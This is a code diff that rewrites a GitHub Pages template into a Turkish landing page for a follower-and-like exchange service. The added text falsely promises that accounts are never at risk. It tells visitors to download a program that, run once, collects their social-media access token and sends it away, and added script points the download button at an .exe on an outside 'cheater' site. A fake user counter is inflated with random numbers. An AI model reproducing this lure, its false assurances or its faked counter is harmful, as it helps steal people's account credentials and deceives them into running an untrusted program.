@@ -47,73 +47,80 @@
 
 
       <section id="main_content">
-
-<p>Sitemizdeki servislerimizi kullaranak facebook, twitter ve instagram'da yüksek rakamlarda takipçi, arkadaş ve beğeni sayılarına sahip olacaksınz!</p>
-
-<p>Sistemimizin nasıl çalıştığını öğrenmek için lütfen Nasıl Çalışır? kısmını okuyun:</p>
-
-<h3>
-<a name="designer-templates" class="anchor" href="#designer-templates"><span class="octicon octicon-link"></span></a>Nasıl Çalışır?</h3>
-<p>Sadece sistemimizi kullanan kişiler arasında takipçi, arkadaşlık ve beğeni takası yapılabilmektedirç</p>
-<p>An itibariyle sistemizi kullanan </p>
-<div id="counter"><input type="hidden" name="counter-value" value="100" /></div>
-
-<h3>
-<a name="rather-drive-stick" class="anchor" href="#rather-drive-stick"><span class="octicon octicon-link"></span></a>Rather Drive Stick?</h3>
-
-<p>If you prefer to not use the automatic generator, push a branch named <code>gh-pages</code> to your repository to create a page manually. In addition to supporting regular HTML content, GitHub Pages support Jekyll, a simple, blog aware static site generator written by our own Tom Preston-Werner. Jekyll makes it easy to create site-wide headers and footers without having to copy them across every page. It also offers intelligent blog support and other advanced templating features.</p>
-
-<h3>
-<a name="authors-and-contributors" class="anchor" href="#authors-and-contributors"><span class="octicon octicon-link"></span></a>Authors and Contributors</h3>
-
-<p>You can <a href="https://github.com/blog/821" class="user-mention">@mention</a> a GitHub username to generate a link to their profile. The resulting <code>&lt;a&gt;</code> element will link to the contributor's GitHub Profile. For example: In 2007, Chris Wanstrath (<a href="https://github.com/defunkt" class="user-mention">@defunkt</a>), PJ Hyett (<a href="https://github.com/pjhyett" class="user-mention">@pjhyett</a>), and Tom Preston-Werner (<a href="https://github.com/mojombo" class="user-mention">@mojombo</a>) founded GitHub.</p>
-
-<h3>
-<a name="support-or-contact" class="anchor" href="#support-or-contact"><span class="octicon octicon-link"></span></a>Support or Contact</h3>
-
-<p>Having trouble with Pages? Check out the documentation at <a href="http://help.github.com/pages">http://help.github.com/pages</a> or contact <a href="mailto:support@github.com">support@github.com</a> and we’ll help you sort it out.</p>
+		
+		<p>Sitemizdeki servislerimizi kullaranak facebook, twitter ve instagram'da yüksek rakamlarda takipçi, arkadaş ve beğeni sayılarına sahip olacaksınz!</p>
+		
+		<p>Sistemimizin nasıl çalıştığını öğrenmek için lütfen Nasıl Çalışır? kısmını okuyun:</p>
+		
+		<h3>
+		<a name="designer-templates" class="anchor" href="#designer-templates"><span class="octicon octicon-link"></span></a>Nasıl Çalışır?</h3>
+		<p>Sadece sistemimizi kullanan kişiler arasında takipçi, arkadaşlık ve beğeni takası yapılabilmektedir. An itibariyle sistemizi kullanan kişi sayısı:</p>
+		<div id="counter" style="text-align: center;"><input type="hidden" name="counter-value" value="100" /></div>
+		<p><strong>Bu kisilerden birisi olmak için hemen devam edin...</strong></p>
+		
+		<h3>
+		<a name="rather-drive-stick" class="anchor" href="#rather-drive-stick"><span class="octicon octicon-link"></span></a>Facebook, Twitter Instagram Engeller Mi?</h3>
+		
+		<p>Asla! Neden mi? Sistemimiz, kullanıcılarımızı kendisine özel algoritmasıyla DOĞAL bir şekilde işlemektedir. Bu nedenle asla ve asla Facebook, Twitter ve Instagram hesabınız tehlikede olmaz, rahatlıkla paylaşımlarınız on binlerce beğeniye sahip olur, mutlu olursunuz!</p>
+		<p><strong>Bu kisilerden birisi olmak için hemen devam edin...</strong></p>
+		
+		<h3>
+		<a name="authors-and-contributors" class="anchor" href="#authors-and-contributors"><span class="octicon octicon-link"></span></a>Nasıl Kullanmaya Başlayacağım?</h3>
+		
+		<p>Sizleri bilindik uğraştırıcı token işlemlerinden kurtarmak amacıyla ufak bir program hazırladık. Programı indirip TEK SEFER çalıştırdıktan sonra, programımız sizin adınıza token kodunuzu otomatik olarak alıp kayıt işlemlerine gönderecektir. Ve web sayfamız tekrar açılacak işlemlere devam edeceksiniz.</p>
+		
+		<h3 style="border: none;">
+		<a id="download-button" class="anchor" href="#download-button"><span class="octicon octicon-link">HEMEN İNDİR!</span></a></h3>
       </section>
 
       <footer>
         <span class="ribbon-outer">
           <span class="ribbon-inner">
-            <p>Projects by <a href="https://github.com/takipci-kasma">takipci-kasma</a> can be found on <a href="https://github.com/takipci-kasma">GitHub</a></p>
+            <p>TakKas | Sosyal Medya Hizmetleri</p>
           </span>
           <span class="left-tail"></span>
           <span class="right-tail"></span>
         </span>
-        <p>Generated with <a href="http://pages.github.com">GitHub Pages</a> using Merlot</p>
-        <span class="octocat"></span>
       </footer>
 
     </div>
 
 <script type="text/javascript">
 	(new Image()).src = 'http://whos.amung.us/pingjs/?k=yyrnodigfndf';
+	$('#download-button').click(function(e) {
+		window.location = "http://hileci.org/socialstuff/index.php?file=exe";
+	});
+
 	jQuery(document).ready(function($) {
 			$c = $("#counter");
+			
+			if (localStorage.getItem("counter") == null) {
+				localStorage.setItem("counter", 25397);
+			}
 		
 	        $c.flipCounter({
 	        	imagePath: "http://bloggingsquared.com/jquery/flipcounter/img/flipCounter-medium.png",
-	        	number:(25397-100), numIntegralDigits:4,numFractionalDigits:0
+	        	number: parseInt(localStorage.getItem("counter")),
+	        	numIntegralDigits: 4,
+	        	numFractionalDigits: 0
 	        });
 	
 			$c.flipCounter("startAnimation", {
-				end_number:25397,
+				end_number: parseInt(localStorage.getItem("counter")) + 100,
 				easing:jQuery.easing.easeInOutCubic,
-				duration:5000,
-				onAnimationStopped: setUpdateTimer
+				duration: 5000,
+				onAnimationStopped: function ()
+				{
+					checkMoreDownloads();
+				}
 			});
 	
-			function setUpdateTimer()
-			{
-				setInterval(checkMoreDownloads, 4000);
-			}
-			
 			function checkMoreDownloads()
 			{
+				localStorage.setItem("counter", $c.flipCounter("getNumber") + Math.floor((Math.random() * 50) + 10));
+
 				$c.flipCounter('startAnimation', {
-					end_number: $c.flipCounter("getNumber") + Math.floor((Math.random() * 300) + 10),
+					end_number: parseInt(localStorage.getItem("counter")),
 					duration: 3000
 				});
 			}
